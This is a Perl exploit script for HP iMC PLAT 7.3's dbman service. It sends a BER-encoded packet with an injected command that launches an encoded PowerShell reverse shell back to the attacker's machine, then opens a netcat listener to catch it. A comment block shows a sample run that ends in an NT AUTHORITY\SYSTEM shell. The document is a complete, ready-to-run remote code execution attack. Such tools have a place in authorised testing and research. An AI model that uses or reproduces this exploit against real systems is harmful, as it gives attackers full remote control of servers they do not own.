#  ./dbman_HPe_iMC_PLAT-7.3_remote_powershell.pl 10.0.1.122 10.0.1.2
#  Crafting payload with 10.0.1.2:7777...
#  Enbering payload data...
#  Binary encoding opcode 10008 and allocation size 560...
#  With a 537 byte powershell payload...
#  Getting ready to send exploit!
#  Waiting for shell... (this should only take a second or two)
#  Connection from 10.0.1.122:49172
#  whoami
#  nt authority\system
#  PS C:\Windows\system32> woo woo
#

use lib 'lib';
use Encoding::BER;
use Socket;
use strict;
if ( scalar(@ARGV) != 2 ) {
    print "Marshall Whittaker / oxagast\n";
    print "HP iMC PLAT 7.3 dbman exploit 2021\n";
    print "  useage ./sploit <victim> <attacker>\n";
}
else {
    my $revport  = 7777;
    my $victim   = @ARGV[0];
    my $attacker = @ARGV[1];
    print "Crafting payload with $attacker:$revport...\n";
    # this is a normal powershell reverse payload, but i added a 
    # pause so that we have time to make sure netcat is active
    my $payload =
'x"& powershell -nop -exec bypass -c "Start-Sleep -s 1;$client = New-Object System.Net.Sockets.TCPClient(\''
      . $attacker . "\',"
      . $revport
      . ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" &';
    print "Enbering payload data...\n";
    my $ber  = Encoding::BER->new;
    my $data = [
        { type => ['octet_string'], value => '0' },
        { type => ['integer'],      value => 4 },
        { type => ['octet_string'], value => $payload },
        { type => ['octet_string'], value => 'x' },
        { type => ['octet_string'], value => 'x' },
        { type => ['octet_string'], value => 'x' },
    ];
    my $p = $ber->encode($data);
    print "Binary encoding opcode 10008 and allocation size "
      . length($p) . "...\n";
    print "With a " . length($payload) . " byte powershell payload...\n";
    my $sz   = pack( "H8", sprintf( "%08x", length($p) ) );
    my $payl = pack( "H8", sprintf( "%08x", 10008 ) ) . $sz . $p;

    my $port = 2810;
    socket( SOCKET, PF_INET, SOCK_STREAM, ( getprotobyname('tcp') )[2] )
      or die "Can't create a socket $!\n";
    connect( SOCKET, pack_sockaddr_in( $port, inet_aton($victim) ) )
      or die "Can't connect to $victim:$port! \n";
    print "Getting ready to send exploit!\n";
    print SOCKET $payl;
    close SOCKET or die "close: $!";
    print "Waiting for shell... (this should only take a second or two)\n";
    system("nc -l -p $revport -v");
}
